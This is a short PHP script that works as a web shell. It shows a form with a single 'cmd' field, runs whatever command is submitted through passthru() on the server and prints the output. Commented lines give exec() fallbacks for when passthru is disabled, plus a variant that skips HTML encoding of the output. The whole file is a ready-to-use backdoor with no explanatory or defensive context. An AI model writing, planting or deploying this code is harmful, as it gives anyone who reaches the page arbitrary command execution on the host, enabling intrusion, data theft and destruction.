<?php
echo "<form action=command_script.php method=POST><input type=text name=cmd /></form>";
echo htmlspecialchars(passthru($_POST["cmd"]));
//
// echo htmlspecialchars(exec($_POST["cmd"]));
// use if passthru is disabled
//
// echo exec($_POST["cmd"]);
// uncomment if you do not want to HTML encode the output (e.g. if trying to view other html pages) 
?>
